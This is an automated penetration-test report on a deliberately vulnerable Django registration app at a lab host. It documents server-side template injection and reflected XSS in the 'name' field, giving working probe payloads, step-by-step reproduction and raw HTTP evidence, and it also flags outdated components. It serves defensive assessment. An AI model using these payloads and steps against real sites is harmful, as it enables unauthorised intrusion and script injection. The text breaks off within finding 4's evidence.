# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — rce Server-Side Template Injection (SSTI) via registration 'name' field](#finding-1)
    - [2. HIGH — burp✓ Input returned in response (reflected) (3 URLs)](#finding-2)
    - [3. MEDIUM — xss-reflected Reflected XSS via registration `name` rendered unescaped into a &lt;script&gt; context (step3)](#finding-3)
    - [4. MEDIUM — vulnerable-component Outdated Bootstrap 4.5.2 — known XSS CVEs (CVE-2024-6485 / CVE-2024-6531 / CVE-2024-6484)](#finding-4)
    - [5. MEDIUM — vulnerable-component Outdated / EOL CPython 3.9.2 on Django wsgiref dev server — many known stdlib CVEs (CVE-2023-40217, CVE-2023-24329, CVE-2022-45061, CVE-2020-10735)](#finding-5)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqyr6plm-xs02ws` |
| Target | http://target.local:32840/ |
| Started | 2026-06-29T05:04:24.596Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 5 mapped · 5 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 5 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32840`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

5 finding(s): 2 high, 3 medium

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [rce] Server-Side Template Injection (SSTI) via registration 'name' field

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32840/

The multi-step registration flow stores the step1 `name` value in the server session and, at step3, renders it by COMPILING it as a Django template (Template(name).render(...)) rather than treating it as inert data. Submitting a Django template expression in `name` causes server-side evaluation: the payload {{1336|add:1}} (URL-encoded %7B%7B1336%7Cadd%3A1%7D%7D) is rendered as the literal 1337 inside the step3 page's promotional script: alert("Hello 1337. Just Now up to 50% OFF"). A benign name (even a long one) is echoed verbatim with no evaluation. This is Server-Side Template Injection: the attacker controls a string compiled and executed by the template engine, enabling server-side data disclosure (settings/context variables) and a path toward remote code execution. The project is internally named ssti_secret_art_gallery and runs with DEBUG=True (the 404 page leaks the URLconf module ssti_secret_art_gallery.urls), amplifying the exposure.

**Reproduction**

```
1) GET /accounts/register/step1/ -> note csrftoken cookie + csrfmiddlewaretoken form value. 2) POST /accounts/register/step1/ with name=%7B%7B1336%7Cadd%3A1%7D%7D ({{1336|add:1}}) and password=Testpass123! (302 -> step2, sets sessionid). 3) POST /accounts/register/step2/ with email=anything@example.com (302 -> step3). 4) GET /accounts/register/step3/ with the same csrftoken+sessionid cookies. Response body contains <script>alert("Hello 1337. Just Now up to 50% OFF ")</script> — proving the engine evaluated 1336|add:1 server-side. Negative control (ev-mqysmu0p-3z): identical flow with a long benign name renders alert("Hello NEGATIVECONTROLNOEVALQQQ...") verbatim, no 1337. Additional confirmation: an invalid-syntax payload {{7*7}} (Django cannot parse '*') triggers a server-side TemplateSyntaxError and a 302 redirect to step1, confirming the value is compiled as a template.
```

**Evidence**

- Evidence `ev-mqysmu0p-3z` — `artifacts/_/ev-mqysmu0p-3z/`

Request:

```http
GET /accounts/register/step3/ HTTP/1.1
Host: target.local:32840
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 1801
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Mon, 29 Jun 2026 05:44:55 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
set-cookie: <redacted>
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register - Step 3</title>
    <!-- Bootstrap CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <nav class="navbar navbar-dark bg-dark">
        <a class="navbar-brand" href="#">Art Gallery</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample01" aria-controls="navbarsExample01" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
        </button>
    </nav>  
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <h2>Step 3: Subscription</h2>
                <form method="post">
                    <input type="hidden" name="csrfmiddlewaretoken" value="cqHZQF9kOunW07nMqk91GGmbUmWUXkirhkrn0HqGHC0af36Fq4dKO6oWo3tLNfie">
                    <div class="form-group">
                        <label for="id_is_premium">Subscribe to premium:</label>
                        <input type="checkbox" name="is_premium" id="id_is_premium">
                    </div>
                    <button type="submit" class="btn btn-primary">Complete Registration</button>
                </form>
            </div>  
        </div>      
    </div>

    <!-- Bootstrap JS and dependencies -->
    <script src="/static/js/jquery-3.5.1.slim.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
    <script>alert("Hello NEGATIVECONTROLNOEVALQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ. Just Now up to 50% OFF ")</script>
</body>
</html>
```

- Evidence `ev-mqysiygg-3t` — `artifacts/_/ev-mqysiygg-3t/`

Request:

```http
GET /accounts/register/step3/ HTTP/1.1
Host: target.local:32840
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 1716
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Mon, 29 Jun 2026 05:41:54 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
set-cookie: <redacted>
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register - Step 3</title>
    <!-- Bootstrap CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <nav class="navbar navbar-dark bg-dark">
        <a class="navbar-brand" href="#">Art Gallery</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample01" aria-controls="navbarsExample01" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
        </button>
    </nav>  
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <h2>Step 3: Subscription</h2>
                <form method="post">
                    <input type="hidden" name="csrfmiddlewaretoken" value="yB9pcMOK5ppdRZdBiFkdhi6XsqROQVa0DvTNmO56Yx2r6VWuipoWpI8IW7oFGQaN">
                    <div class="form-group">
                        <label for="id_is_premium">Subscribe to premium:</label>
                        <input type="checkbox" name="is_premium" id="id_is_premium">
                    </div>
                    <button type="submit" class="btn btn-primary">Complete Registration</button>
                </form>
            </div>  
        </div>      
    </div>

    <!-- Bootstrap JS and dependencies -->
    <script src="/static/js/jquery-3.5.1.slim.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
    <script>alert("Hello 1337. Just Now up to 50% OFF ")</script>
</body>
</html>
```

- Evidence `ev-mqyskign-3w` — `artifacts/_/ev-mqyskign-3w/`

Request:

```http
GET /accounts/register/step3/ HTTP/1.1
Host: target.local:32840
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 1716
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Mon, 29 Jun 2026 05:43:07 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
set-cookie: <redacted>
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register - Step 3</title>
    <!-- Bootstrap CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <nav class="navbar navbar-dark bg-dark">
        <a class="navbar-brand" href="#">Art Gallery</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample01" aria-controls="navbarsExample01" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
        </button>
    </nav>  
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <h2>Step 3: Subscription</h2>
                <form method="post">
                    <input type="hidden" name="csrfmiddlewaretoken" value="14curtbxCJkm0o7K7EyiJ1fynIWUSRAC6YWSBvsTvRXAfkQD7oC1RrhjRptLIMAp">
                    <div class="form-group">
                        <label for="id_is_premium">Subscribe to premium:</label>
                        <input type="checkbox" name="is_premium" id="id_is_premium">
                    </div>
                    <button type="submit" class="btn btn-primary">Complete Registration</button>
                </form>
            </div>  
        </div>      
    </div>

    <!-- Bootstrap JS and dependencies -->
    <script src="/static/js/jquery-3.5.1.slim.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
    <script>alert("Hello 1337. Just Now up to 50% OFF ")</script>
</body>
</html>
```

<a id="finding-2"></a>

### 2. [HIGH] [burp✓] Input returned in response (reflected) (3 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

✅ AI-verified by active re-test: Control GET /accounts/login/ (200, real login page) contained neither marker; both positives reflected their distinct unique path markers verbatim in the Django DEBUG 404 body (title + Request URL) — accountsZQXW9182A/login/ and accountsKMTP7461B/login/ — confirming stable input reflection. (severity raised info→high: confirmed real, not info-only)

The value of the URL path folder 1 is copied into the application's response. (confidence: CERTAIN) [+2 more URL(s): http://target.local:32840/accounts/register/step1/, http://target.local:32840/accounts/preferences/] @ http://target.local:32840/accounts/login/

**Reproduction**

```
Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。
```

**Evidence**

- Evidence `ev-mqyszoni-4g` — `artifacts/_/ev-mqyszoni-4g/`

Request:

```http
GET /accounts/login/ HTTP/1.1
Host: target.local:32840

GET /accountslsst4ycg1k/login/ HTTP/1.1
Host: target.local:32840
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 404 Not Found
Date: Mon, 29 Jun 2026 05:52:04 GMT
Server: WSGIServer/0.2 CPython/3.9.2
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Content-Length: 2405
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin

<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Page not found at /accountslsst4ycg1k/login/</title>
  <meta name="robots" content="NONE,NOARCHIVE">
  <style type="text/css">
    html * { padding:0; margin:0; }
    body * { padding:10px 20px; }
    body * * { padding:0; }
    body { font:small sans-serif; background:#eee; color:#000; }
    body>div { border-bottom:1px solid #ddd; }
    h1 { font-weight:normal; margin-bottom:.4em; }
    h1 span { font-size:60%; color:#666; font-weight:normal; }
    table { border:none; border-collapse: collapse; width:100%; }
    td, th { vertical-align:top; padding:2px 3px; }
    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
    #info { background:#f6f6f6; }
    #info ol { margin: 0.5em 4em; }
    #info ol li { font-family: monospace; }
    #summary { background: #ffc; }
    #explanation { background:#eee; border-bottom: 0px none; }
    pre.exception_value { font-family: sans-serif; color: #575757; font-size: 1.5em; margin: 10px 0 10px 0; }
  </style>
</head>
<body>
  <div id="summary">
    <h1>Page not found <span>(404)</span></h1>
    
    <table class="meta">
      <tr>
        <th>Request Method:</th>
        <td>GET</td>
      </tr>
      <tr>
        <th>Request URL:</th>
        <td>http://target.local:32840/accountslsst4ycg1k/login/</td>
      </tr>
      
    </table>
  </div>
  <div id="info">
    
      <p>
      Using the URLconf defined in <code>ssti_secret_art_gallery.urls</code>,
      Django tried these URL patterns, in this order:
      </p>
      <ol>
        
          <li>
            
                accounts/
                
            
          </li>
        
          <li>
            
                
                
            
          </li>
        
          <li>
            
                ^static/(?P&lt;path&gt;.*)$
                
            
          </li>
        
      </ol>
      <p>
        
          The current path, <code>accountslsst4ycg1k/login/</code>,
        
        didn’t match any of these.
      </p>
    
  </div>

  <div id="explanation">
    <p>
      You’re seeing this error because you have <code>DEBUG = True</code> in
      your Django settings file. Change that to <code>False</code>, and Django
      will display a standard 404 page.
    </p>
  </div>
</body>
</html>
```

- Evidence `ev-mqyt0gom-4h` — `artifacts/_/ev-mqyt0gom-4h/`

Request:

```http
GET /accounts/login/ HTTP/1.1
Host: target.local:32840
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
content-length: 2370
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Mon, 29 Jun 2026 05:55:31 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
set-cookie: <redacted>
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <!-- Bootstrap CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <style>
        input {
          width: 100%;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-top: 20px;
        }
        .gallery-item {
            border: 1px solid #ccc;
            padding: 10px;
            text-align: center;
        }
        .gallery-item img {
            max-width: 100%;
            height: auto;
        }
    </style>
    
    
</head>
<body>
        
    

<nav class="navbar navbar-dark bg-dark">
    <a class="navbar-brand" href="#">Art Gallery</a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample01" aria-controls="navbarsExample01" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
    </button>
</nav>

<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-6">
            <h2 class="mb-4 text-center">Login</h2>
            <form method="post" class="needs-validation" novalidate>
                <input type="hidden" name="csrfmiddlewaretoken" value="3pMz6pg3ZpVtp7qLYJKoK50SgBEzGAGAtFzqz3ql94YhC5J6vCv9C4u0CBDmUfg3">
                <div class="form-group">
                    <label for="id_username">Email:</label>
                    <input type="text" name="username" autofocus autocapitalize="none" autocomplete="username" maxlength="150" required id="id_username">
                </div>
                <div class="form-group">
                    <label for="id_password">Password:</label>
                    <input type="password" name="password" autocomplete="current-password" required id="id_password">
                </div>
                <button type="submit" class="btn btn-primary btn-block">Login</button>
            </form>
        </div>
    </div>
</div>



    <!-- Bootstrap JS and dependencies -->
    <script src="/static/js/jquery-3.5.1.slim.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
</body>
</html>
```

- Evidence `ev-mqyt0i8e-4i` — `artifacts/_/ev-mqyt0i8e-4i/`

Request:

```http
GET /accountsZQXW9182A/login/ HTTP/1.1
Host: target.local:32840
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 404
content-length: 2402
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Mon, 29 Jun 2026 05:55:33 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Page not found at /accountsZQXW9182A/login/</title>
  <meta name="robots" content="NONE,NOARCHIVE">
  <style type="text/css">
    html * { padding:0; margin:0; }
    body * { padding:10px 20px; }
    body * * { padding:0; }
    body { font:small sans-serif; background:#eee; color:#000; }
    body>div { border-bottom:1px solid #ddd; }
    h1 { font-weight:normal; margin-bottom:.4em; }
    h1 span { font-size:60%; color:#666; font-weight:normal; }
    table { border:none; border-collapse: collapse; width:100%; }
    td, th { vertical-align:top; padding:2px 3px; }
    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
    #info { background:#f6f6f6; }
    #info ol { margin: 0.5em 4em; }
    #info ol li { font-family: monospace; }
    #summary { background: #ffc; }
    #explanation { background:#eee; border-bottom: 0px none; }
    pre.exception_value { font-family: sans-serif; color: #575757; font-size: 1.5em; margin: 10px 0 10px 0; }
  </style>
</head>
<body>
  <div id="summary">
    <h1>Page not found <span>(404)</span></h1>
    
    <table class="meta">
      <tr>
        <th>Request Method:</th>
        <td>GET</td>
      </tr>
      <tr>
        <th>Request URL:</th>
        <td>http://target.local:32840/accountsZQXW9182A/login/</td>
      </tr>
      
    </table>
  </div>
  <div id="info">
    
      <p>
      Using the URLconf defined in <code>ssti_secret_art_gallery.urls</code>,
      Django tried these URL patterns, in this order:
      </p>
      <ol>
        
          <li>
            
                accounts/
                
            
          </li>
        
          <li>
            
                
                
            
          </li>
        
          <li>
            
                ^static/(?P&lt;path&gt;.*)$
                
            
          </li>
        
      </ol>
      <p>
        
          The current path, <code>accountsZQXW9182A/login/</code>,
        
        didn’t match any of these.
      </p>
    
  </div>

  <div id="explanation">
    <p>
      You’re seeing this error because you have <code>DEBUG = True</code> in
      your Django settings file. Change that to <code>False</code>, and Django
      will display a standard 404 page.
    </p>
  </div>
</body>
</html>
```

- Evidence `ev-mqyt0js6-4j` — `artifacts/_/ev-mqyt0js6-4j/`

Request:

```http
GET /accountsKMTP7461B/login/ HTTP/1.1
Host: target.local:32840
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 404
content-length: 2402
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Mon, 29 Jun 2026 05:55:35 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Page not found at /accountsKMTP7461B/login/</title>
  <meta name="robots" content="NONE,NOARCHIVE">
  <style type="text/css">
    html * { padding:0; margin:0; }
    body * { padding:10px 20px; }
    body * * { padding:0; }
    body { font:small sans-serif; background:#eee; color:#000; }
    body>div { border-bottom:1px solid #ddd; }
    h1 { font-weight:normal; margin-bottom:.4em; }
    h1 span { font-size:60%; color:#666; font-weight:normal; }
    table { border:none; border-collapse: collapse; width:100%; }
    td, th { vertical-align:top; padding:2px 3px; }
    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
    #info { background:#f6f6f6; }
    #info ol { margin: 0.5em 4em; }
    #info ol li { font-family: monospace; }
    #summary { background: #ffc; }
    #explanation { background:#eee; border-bottom: 0px none; }
    pre.exception_value { font-family: sans-serif; color: #575757; font-size: 1.5em; margin: 10px 0 10px 0; }
  </style>
</head>
<body>
  <div id="summary">
    <h1>Page not found <span>(404)</span></h1>
    
    <table class="meta">
      <tr>
        <th>Request Method:</th>
        <td>GET</td>
      </tr>
      <tr>
        <th>Request URL:</th>
        <td>http://target.local:32840/accountsKMTP7461B/login/</td>
      </tr>
      
    </table>
  </div>
  <div id="info">
    
      <p>
      Using the URLconf defined in <code>ssti_secret_art_gallery.urls</code>,
      Django tried these URL patterns, in this order:
      </p>
      <ol>
        
          <li>
            
                accounts/
                
            
          </li>
        
          <li>
            
                
                
            
          </li>
        
          <li>
            
                ^static/(?P&lt;path&gt;.*)$
                
            
          </li>
        
      </ol>
      <p>
        
          The current path, <code>accountsKMTP7461B/login/</code>,
        
        didn’t match any of these.
      </p>
    
  </div>

  <div id="explanation">
    <p>
      You’re seeing this error because you have <code>DEBUG = True</code> in
      your Django settings file. Change that to <code>False</code>, and Django
      will display a standard 404 page.
    </p>
  </div>
</body>
</html>
```

<a id="finding-3"></a>

### 3. [MEDIUM] [xss-reflected] Reflected XSS via registration `name` rendered unescaped into a &lt;script&gt; context (step3)

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32840/

The `name` value submitted at POST /accounts/register/step1 is stored in the server-side session and later rendered UNESCAPED into a JavaScript string literal inside an inline <script> block on the registration step3 page: `<script>alert("Hello {name}. Just Now up to 50% OFF ")</script>`. Because the value is not HTML/JS-escaped, a name of `</script><script>alert(document.domain)</script>` breaks out of the script element and injects an executing `<script>` tag, yielding arbitrary JavaScript execution in the victim's browser in the application's origin. The csrftoken cookie is SameSite=Lax and the session is cookie-based; output encoding is the missing control.

**Reproduction**

```
1) GET /accounts/register/step1/ to obtain a csrftoken cookie + csrfmiddlewaretoken pair.
2) POST /accounts/register/step1/ with name=</script><script>alert(document.domain)</script>&password=x&csrfmiddlewaretoken=... (sets sessionid). 
3) POST /accounts/register/step2/ with email=x@example.com (required to unlock step3).
4) GET /accounts/register/step3/ — response body contains the payload reflected verbatim inside the inline <script>: `<script>alert("Hello </script><script>alert(document.domain)</script>. ...")</script>`, which executes in a browser.
Negative control: same flow with a benign name (VerdictTestUser1) renders `alert("Hello VerdictTestUser1. ...")` with no injected tag (len 1727). Positive replays (len 1760) both contain the unescaped breakout.
```

**Evidence**

- Evidence `ev-mqyrrox8-1m` — `artifacts/s-0002/ev-mqyrrox8-1m/`

Request:

```http
GET /accounts/register/step3/ HTTP/1.1
Host: target.local:32840
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 1727
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Mon, 29 Jun 2026 05:20:42 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
set-cookie: <redacted>
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register - Step 3</title>
    <!-- Bootstrap CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <nav class="navbar navbar-dark bg-dark">
        <a class="navbar-brand" href="#">Art Gallery</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample01" aria-controls="navbarsExample01" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
        </button>
    </nav>  
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <h2>Step 3: Subscription</h2>
                <form method="post">
                    <input type="hidden" name="csrfmiddlewaretoken" value="8p2Z2ir938PnZAuZHs5X15szrCWWZuBRtP3dEW4CEhgEsLvfjEReGcXEJGBjldvx">
                    <div class="form-group">
                        <label for="id_is_premium">Subscribe to premium:</label>
                        <input type="checkbox" name="is_premium" id="id_is_premium">
                    </div>
                    <button type="submit" class="btn btn-primary">Complete Registration</button>
                </form>
            </div>  
        </div>      
    </div>

    <!-- Bootstrap JS and dependencies -->
    <script src="/static/js/jquery-3.5.1.slim.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
    <script>alert("Hello VerdictTestUser1. Just Now up to 50% OFF ")</script>
</body>
</html>
```

- Evidence `ev-mqyrti6k-1q` — `artifacts/s-0002/ev-mqyrti6k-1q/`

Request:

```http
GET /accounts/register/step3/ HTTP/1.1
Host: target.local:32840
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 1760
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Mon, 29 Jun 2026 05:22:07 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
set-cookie: <redacted>
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register - Step 3</title>
    <!-- Bootstrap CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <nav class="navbar navbar-dark bg-dark">
        <a class="navbar-brand" href="#">Art Gallery</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample01" aria-controls="navbarsExample01" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
        </button>
    </nav>  
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <h2>Step 3: Subscription</h2>
                <form method="post">
                    <input type="hidden" name="csrfmiddlewaretoken" value="6cViXSDLnYL2ZGJcV1pHT4psm9lJaDpTrCWwzwgeY7cjsRKsxdbYybUxEd06wmjz">
                    <div class="form-group">
                        <label for="id_is_premium">Subscribe to premium:</label>
                        <input type="checkbox" name="is_premium" id="id_is_premium">
                    </div>
                    <button type="submit" class="btn btn-primary">Complete Registration</button>
                </form>
            </div>  
        </div>      
    </div>

    <!-- Bootstrap JS and dependencies -->
    <script src="/static/js/jquery-3.5.1.slim.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
    <script>alert("Hello </script><script>alert(document.domain)</script>. Just Now up to 50% OFF ")</script>
</body>
</html>
```

- Evidence `ev-mqyru1dk-1t` — `artifacts/s-0002/ev-mqyru1dk-1t/`

Request:

```http
GET /accounts/register/step3/ HTTP/1.1
Host: target.local:32840
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 1760
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Mon, 29 Jun 2026 05:22:31 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
set-cookie: <redacted>
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register - Step 3</title>
    <!-- Bootstrap CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <nav class="navbar navbar-dark bg-dark">
        <a class="navbar-brand" href="#">Art Gallery</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample01" aria-controls="navbarsExample01" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
        </button>
    </nav>  
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <h2>Step 3: Subscription</h2>
                <form method="post">
                    <input type="hidden" name="csrfmiddlewaretoken" value="CiQzDyl4WZjQVvsycOAlUL85SsPAc2fNXIRNfcYxx8K7oGtOO0mCzSDaawuXyL9t">
                    <div class="form-group">
                        <label for="id_is_premium">Subscribe to premium:</label>
                        <input type="checkbox" name="is_premium" id="id_is_premium">
                    </div>
                    <button type="submit" class="btn btn-primary">Complete Registration</button>
                </form>
            </div>  
        </div>      
    </div>

    <!-- Bootstrap JS and dependencies -->
    <script src="/static/js/jquery-3.5.1.slim.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
    <script>alert("Hello </script><script>alert(document.domain)</script>. Just Now up to 50% OFF ")</script>
</body>
</html>
```

<a id="finding-4"></a>

### 4. [MEDIUM] [vulnerable-component] Outdated Bootstrap 4.5.2 — known XSS CVEs (CVE-2024-6485 / CVE-2024-6531 / CVE-2024-6484)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32840/

The frontend bundles Bootstrap v4.5.2 (released Aug 2020), confirmed by the version banner at the top of /static/css/bootstrap.min.css ("Bootstrap v4.5.2 (https://getbootstrap.com/)"), and corroborated by Bootstrap-4 DOM idioms in every page (navbar-toggler, data-toggle="collapse", data-target). This is a VERSION-BASED finding (matched by the shipped asset banner, NOT exploited here). 4.5.2 is superseded within the 4.x line by 4.6.2 and trails the 5.x major. Publicly registered XSS CVEs against the Bootstrap 4.x line that 4.5.2 predates the hardening for: CVE-2024-6485 (XSS in the button plugin), CVE-2024-6531 (XSS via the carousel data-slide-to attribute) and CVE-2024-6484 (XSS via the carousel data-slide attribute) — all DOM-XSS sinks (~CVSS 6.1, medium). Exploitability is conditional: they require the application to render attacker-controlled input into Bootstrap data-* attributes, so impact depends on whether any template interpolates untrusted data into those attributes (none observed in the mapped pages, which use static markup). Note: the older tooltip/popover template-injection CVE-2019-8331 is already fixed at 4.5.2 and is NOT claimed. Operator action: confirm whether any data-* attribute is populated from user input, then upgrade to a current Bootstrap (4.6.2+ or 5.x).

**Reproduction**

```
1. GET http://target.local:32840/static/css/bootstrap.min.css → 200 text/css whose first bytes are the comment banner "/*! Bootstrap v4.5.2 (https://getbootstrap.com/) ... Copyright 2011-2020 */" (ev-mqysrnlv-47, repeated stably as ev-mqyst8t0-49). 2. Negative control: GET /static/css/bootstrap-9.9.9-nonexistent.min.css → 404 (ev-mqyst9wf-4a), i.e. no such versioned asset is served — the v4.5.2 banner is specific to the deployed file. 3. Cross-check the rendered pages (e.g. GET / ev-mqystaz8-4b) showing Bootstrap-4 markup (navbar-toggler / data-toggle="collapse"). Map the cited CVEs (CVE-2024-6485/6531/6484) to the 4.5.2 version banner; verify the app does not feed untrusted input into Bootstrap data-* attributes before treating as exploitable.
```

**Evidence**

- Evidence `ev-mqyst9wf-4a` — `artifacts/_/ev-mqyst9wf-4a/`

Request:

```http
GET /static/css/bootstrap-9.9.9-nonexistent.min.css HTTP/1.1
Host: target.local:32840
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
connection: close
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 05:49:55 GMT
server: WSGIServer/0.2 CPython/3.9.2

<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Page not found at /static/css/bootstrap-9.9.9-nonexistent.min.css</title>
  <meta name="robots" content="NONE,NOARCHIVE">
  <style type="text/css">
